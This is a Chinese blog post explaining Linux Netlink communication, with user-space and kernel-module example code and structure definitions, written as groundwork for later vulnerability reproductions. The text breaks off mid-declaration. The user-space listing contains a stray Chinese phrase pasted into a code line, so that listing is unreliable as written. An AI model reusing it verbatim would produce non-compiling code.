    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转眼间上一篇文章又是几个月前的事情了，主要原因是近期遇到了一个让我十分痴迷的游戏——PUBG！建议直接跟我学习我的无敌闪身喷！依稀记得在蓝楼三楼拐角连续喷死一队被对面骂我是开挂的！哈哈哈哈哈哈哈！！</p><p><strong>最近的十杀1192伤害吃鸡也是久久难以平复。</strong></p><p>前面一直提到我要开始写fuzzing相关内容，本来也就打算从AFL源码开始看然后记录下来，但是在学习完了之后就又懒得写了。当然最主要的还是在同事那里请教了一下挖洞心得，也是让我选择不在纠结于fuzzing之类的“歪门邪道”开始从内心审视代码。</p><p>这篇文章主要目的是简单介绍一下netlink通信机制以及nftables子系统，在这篇文章之后会聚焦复现关于netlink以及nftables子系统相关漏洞，在后续的文章中不会再出现对这它们的解释，所以这篇文章算是为后续的漏洞复现打基础吧。</p><h2 id="Netlink通信机制"><a href="#Netlink通信机制" class="headerlink" title="Netlink通信机制"></a>Netlink通信机制</h2><p>Netlink是Linux提供的用于内核和用户态进程之间的通信方式。但是注意虽然Netlink主要用于用户空间和内核空间的通信，但是也能用于用户空间的两个进程通信。只是进程间通信有其他很多方式，一般不用Netlink。除非需要用到Netlink的广播特性时。</p><p>一般来说用户空间和内核空间的通信方式有三种：&#x2F;proc、ioctl、Netlink。而前两种都是单向的，但是Netlink可以实现双工通信。Netlink协议基于BSD socket和AF_NETLINK地址簇(address family)，使用32位的端口号寻址(以前称作PID)，每个Netlink协议(或称作总线，man手册中则称之为netlink family)，通常与一个或一组内核服务&#x2F;组件相关联，如NETLINK_ROUTE用于获取和设置路由与链路信息、NETLINK_KOBJECT_UEVENT用于内核向用户空间的udev进程发送通知等。</p><h3 id="用户态数据结构"><a href="#用户态数据结构" class="headerlink" title="用户态数据结构"></a>用户态数据结构</h3><p>以下面这个程序为例子对其中涉及到的结构体进行分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PAYLOAD 1024 <span class="comment">// maximum payload size</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_TEST 25 <span class="comment">//自定义的协议</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> state;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">src_addr</span>, <span class="title">dest_addr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> <span class="literal">NULL</span>; <span class="comment">//Netlink数据包头</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sock_fd, retval;</span><br><span class="line">    <span class="keyword">int</span> state_smg = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Create a socket</span></span><br><span class="line">    sock_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_TEST);</span><br><span class="line">    <span class="keyword">if</span>(sock_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error getting socket: %s&quot;</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// To prepare binding</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;src_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(src_addr));</span><br><span class="line">    src_addr.nl_family = AF_NETLINK;</span><br><span class="line">    src_addr.nl_pid = <span class="number">100</span>; <span class="comment">//A：设置源端端口号</span></span><br><span class="line">    src_addr.nl_groups = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//Bind</span></span><br><span class="line">    retval = bind(sock_fd, (struct sockaddr*)&amp;src_addr, <span class="keyword">sizeof</span>(src_addr));</span><br><span class="line">    <span class="keyword">if</span>(retval &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind failed: %s&quot;</span>, strerror(errno));</span><br><span class="line">        close(sock_fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// To orepare create mssage</span></span><br><span class="line">    nlh = (struct nlmsghdr *)<span class="built_in">malloc</span>(NLMSG_SPACE(MAX_PAYLOAD));</span><br><span class="line">    <span class="keyword">if</span>(!nlh)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc nlmsghdr error!\n&quot;</span>);</span><br><span class="line">        close(sock_fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(dest_addr));</span><br><span class="line">    dest_addr.nl_family = AF_NETLINK;</span><br><span class="line">    dest_addr.nl_pid = <span class="number">0</span>; <span class="comment">//B：设置目的端口号</span></span><br><span class="line">    dest_addr.nl_groups = <span class="number">0</span>;</span><br><span class="line">    nlh-&gt;nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);</span><br><span class="line">    nlh-&gt;nlmsg_pid = <span class="number">100</span>; <span class="comment">//C：设置源端口</span></span><br><span class="line">    nlh-&gt;nlmsg_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(NLMSG_DATA(nlh),<span class="string">&quot;Hello you!&quot;</span>); <span class="comment">//设置消息体</span></span><br><span class="line">    iov.iov_base = (<span class="keyword">void</span> *)nlh;</span><br><span class="line">    iov.iov_len = NLMSG_SPACE(MAX_PAYLOAD);</span><br><span class="line">    <span class="comment">//Create mssage</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    msg.msg_name = (<span class="keyword">void</span> *)&amp;dest_addr;</span><br><span class="line">    msg.msg_namelen = <span class="keyword">sizeof</span>(dest_addr);</span><br><span class="line">    msg.msg_iov = &amp;iov;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;定义如下</span><br><span class="line">    <span class="comment">//send message</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;state_smg\n&quot;</span>);</span><br><span class="line">    state_smg = sendmsg(sock_fd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(state_smg == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;get error sendmsg = %s\n&quot;</span>,strerror(errno));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(nlh,<span class="number">0</span>,NLMSG_SPACE(MAX_PAYLOAD));</span><br><span class="line">    <span class="comment">//receive message</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;waiting received!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In while recvmsg\n&quot;</span>);</span><br><span class="line">        state = recvmsg(sock_fd, &amp;msg, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(state&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;state&lt;1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received message: %s\n&quot;</span>,(<span class="keyword">char</span> *) NLMSG_DATA(nlh));</span><br><span class="line">    &#125;</span><br><span class="line">    close(sock_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序首先创建一个socket，这里选择的地址族即为<code>AF_NETLINK</code>，套接字选择类型为SOCK_RAW或SOCK_DGRAM,因为netlink是一个面向数据报的服务，最后协议选择套接字使用哪种netlink特征。</p><p>随后通过bind函数进行地址绑定，可以看到这里第二个参数其实就是结构体<code>struct sockaddr_nl</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> &#123;</span></span><br><span class="line"><span class="keyword">__kernel_sa_family_t</span>nl_family;<span class="comment">/* AF_NETLINK*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>nl_pad;<span class="comment">/* zero*/</span></span><br><span class="line">__u32nl_pid;<span class="comment">/* port ID*/</span></span><br><span class="line">       __u32nl_groups;<span class="comment">/* multicast groups mask */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>简单来看一下这个结构体，首先第一个成员<code>nl_family</code>为固定的<code>AF_NETLINK</code>，其次<code>nl_pad</code>成员在起初是用不到的所以这里为0，重点关注后两个成员。</p><p>成员<code>nl_pid</code>在Netlink规范里，PID全称是Port-ID(32bits)，其主要作用是用于唯一的标识一个基于netlink的socket通道。通常情况下<code>nl_pid</code>都设置为当前进程的进程号。前面我们也说过，Netlink不仅可以实现用户-内核空间的通信还可使现实用户空间两个进程之间，或内核空间两个进程之间的通信。该属性为0时一般指内核。</p><p>成员<code>nl_groups</code>如果用户空间的进程希望加入某个多播组，则必须执行bind()系统调用。该字段指明了调用者希望加入的多播组号的掩码(注意不是组号，后面我们会详细讲解这个字段)。如果该字段为0则表示调用者不希望加入任何多播组。对于每个隶属于Netlink协议域的协议，最多可支持32个多播组(因为nl_groups的长度为32比特)，每个多播组用一个比特来表示。</p><p>回到上面程序流程，紧接着创建一个<code>struct nlmsghdr</code>，该结构体作为Netlink的报文消息头，具体定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">__u32nlmsg_len;<span class="comment">/* Length of message including header */</span></span><br><span class="line">__u16nlmsg_type;<span class="comment">/* Message content */</span></span><br><span class="line">__u16nlmsg_flags;<span class="comment">/* Additional flags */</span></span><br><span class="line">__u32nlmsg_seq;<span class="comment">/* Sequence number */</span></span><br><span class="line">__u32nlmsg_pid;<span class="comment">/* Sending process port ID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先第一个成员很明显其含义就是整个消息的长度，按照字节计算，包括了Netlink消息头本身。</p><p>第二个成员则是消息的类型，第三个成员则是附加在消息的额外说明信息。消息序列号，用以将消息排队，有些类似TCP协议中的序号（不完全一样），但是netlink的这个字段是可选的，不强制使用。最后一个成员表示发送端口的ID号，对于内核来说该值就是0，对于用户进程来说就是其socket所绑定的ID号。</p><p>这里再看申请<code>nlmsghdr</code>时所申请的大小是多少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_ALIGNTO4U</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_ALIGN(len) ( ((len)+NLMSG_ALIGNTO-1) &amp; ~(NLMSG_ALIGNTO-1) )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_HDRLEN ((int) NLMSG_ALIGN(sizeof(struct nlmsghdr)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_LENGTH(len) ((len)+NLMSG_ALIGN(NLMSG_HDRLEN))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_SPACE(len) NLMSG_ALIGN(NLMSG_LENGTH(len))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_DATA(nlh)  ((void*)(((char*)nlh) + NLMSG_LENGTH(0)))</span></span><br></pre></td></tr></table></figure><p>通过简单的运算可以算出来这里申请的堆块大小为：0x410 其含义就是用户自定义的大小 0x400 以及消息头的大小0x10。</p><p>程序再往后就是往DATA段写上消息体，随后设置iov，接着对<code>struct msghdr</code>进行设置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Structure describing messages sent by</span></span><br><span class="line"><span class="comment">   `sendmsg&#x27; and received by `recvmsg&#x27;.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *msg_name;<span class="comment">/* Address to send to/receive from.  */</span></span><br><span class="line">    <span class="keyword">socklen_t</span> msg_namelen;<span class="comment">/* Length of address data.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">msg_iov</span>;</span><span class="comment">/* Vector of data to send/receive into.  */</span></span><br><span class="line">    <span class="keyword">int</span> msg_iovlen;<span class="comment">/* Number of elements in the vector.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *msg_control;<span class="comment">/* Ancillary data (eg BSD filedesc passing). */</span></span><br><span class="line">    <span class="keyword">socklen_t</span> msg_controllen;<span class="comment">/* Ancillary data buffer length.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> msg_flags;<span class="comment">/* Flags in received message.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>这个结构体不仅限于在这种情况下使用，不仅是Netlink专属的一个结构体。这里简单介绍一下这个结构体，首先这里<code>msg_name</code>成员指向的是数据包的目的地址（这里也就是上面的dest_addr，可以注意到其nl_pid为0表示其目的为内核）。然后就是<code>msg_iov</code>也就是指向前面用于指向实际载荷的iov结构，后面的<code>msg_iovlen</code>成员表示的是<code>msg_iov</code>的个数而不是长度。</p><p>程序后续就是发送消息以及接受消息，这里就不过多赘述了（毕竟这一段主要还是说数据结构相关的内容）。</p><h3 id="内核态Netlink-socket-API"><a href="#内核态Netlink-socket-API" class="headerlink" title="内核态Netlink socket API"></a>内核态Netlink socket API</h3><p>这里首先大概介绍一下在面对通信时内核态所需要使用到的相关API，具体的函数分析以及结构体分析放在后面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/timer.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_TEST 25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_MSGSIZE 1024</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stringlength</span><span class="params">(<span class="keyword">char</span> *s)</span></span>;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">nl_sk</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//向用户态进程回发消息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendnlmsg</span><span class="params">(<span class="keyword">char</span> *message, <span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb_1</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> len = NLMSG_SPACE(MAX_MSGSIZE);</span><br><span class="line">    <span class="keyword">int</span> slen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!message || !nl_sk)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_ERR <span class="string">&quot;pid:%d\n&quot;</span>,pid);</span><br><span class="line">    skb_1 = alloc_skb(len,GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(!skb_1)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;my_net_link:alloc_skb error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    slen = stringlength(message);</span><br><span class="line">    nlh = nlmsg_put(skb_1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,MAX_MSGSIZE,<span class="number">0</span>);</span><br><span class="line">    NETLINK_CB(skb_1).pid = <span class="number">0</span>;</span><br><span class="line">    NETLINK_CB(skb_1).dst_group = <span class="number">0</span>;</span><br><span class="line">    message[slen]= <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(NLMSG_DATA(nlh),message,slen+<span class="number">1</span>);</span><br><span class="line">    printk(<span class="string">&quot;my_net_link:send message &#x27;%s&#x27;.\n&quot;</span>,(<span class="keyword">char</span> *)NLMSG_DATA(nlh));</span><br><span class="line">    netlink_unicast(nl_sk,skb_1,pid,MSG_DONTWAIT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stringlength</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> slen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; *s; s++)</span><br><span class="line">    &#123;</span><br><span class="line">        slen++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slen;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//接收用户态发来的消息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nl_data_ready</span><span class="params">(struct sk_buff *__skb)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">     <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> <span class="title">cmpl</span>;</span></span><br><span class="line">     printk(<span class="string">&quot;begin data_ready\n&quot;</span>);</span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">10</span>;</span><br><span class="line">     <span class="keyword">int</span> pid;</span><br><span class="line">     skb = skb_get (__skb);</span><br><span class="line">     <span class="keyword">if</span>(skb-&gt;len &gt;= NLMSG_SPACE(<span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">         nlh = nlmsg_hdr(skb);</span><br><span class="line">         <span class="built_in">memcpy</span>(str, NLMSG_DATA(nlh), <span class="keyword">sizeof</span>(str));</span><br><span class="line">         printk(<span class="string">&quot;Message received:%s\n&quot;</span>,str) ;</span><br><span class="line">         pid = nlh-&gt;nlmsg_pid;</span><br><span class="line">         <span class="keyword">while</span>(i--)</span><br><span class="line">        &#123;<span class="comment">//我们使用completion做延时，每3秒钟向用户态回发一个消息</span></span><br><span class="line">            init_completion(&amp;cmpl);</span><br><span class="line">            wait_for_completion_timeout(&amp;cmpl,<span class="number">3</span> * HZ);</span><br><span class="line">            sendnlmsg(<span class="string">&quot;I am from kernel!&quot;</span>,pid);</span><br><span class="line">        &#125;</span><br><span class="line">         flag = <span class="number">1</span>;</span><br><span class="line">         kfree_skb(skb);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// Initialize netlink</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    nl_sk = netlink_kernel_create(&amp;init_net, NETLINK_TEST, <span class="number">1</span>,</span><br><span class="line">                                 nl_data_ready, <span class="literal">NULL</span>, THIS_MODULE);</span><br><span class="line">    <span class="keyword">if</span>(!nl_sk)&#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;my_net_link: create netlink socket error.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;my_net_link_4: create netlink socket ok.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">netlink_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nl_sk != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        sock_release(nl_sk-&gt;sk_socket);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;my_net_link: self module exited\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(netlink_init);</span><br><span class="line">module_exit(netlink_exit);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;zhao_h&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct sock *<span class="title">netlink_kernel_create</span><span class="params">(struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="keyword">int</span> unit,<span class="keyword">unsigned</span> <span class="keyword">int</span> groups,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="keyword">void</span> (*input)(struct sk_buff *skb),</span></span></span><br><span class="line"><span class="params"><span class="function">                                   struct mutex *cb_mutex,struct <span class="keyword">module</span> *<span class="keyword">module</span>)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>net：是一个网络名字空间namespace，在不同的名字空间里面可以有自己的转发信息库，有自己的一套net_device等等。默认情况下都是使用 init_net这个全局变量。</li><li>unit：表示netlink协议类型，如NETLINK_TEST、NETLINK_SELINUX。</li><li>groups：多播地址。</li><li>input：为内核模块定义的netlink消息处理函数，当有消息到达这个netlink socket时，该input函数指针就会被引用，且只有此函数返回时，调用者的sendmsg才能返回。</li><li>cb_mutex：为访问数据时的互斥信号量。</li><li>module： 一般为THIS_MODULE。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_unicast</span><span class="params">(struct sock *ssk, struct sk_buff *skb, u32 pid, <span class="keyword">int</span> 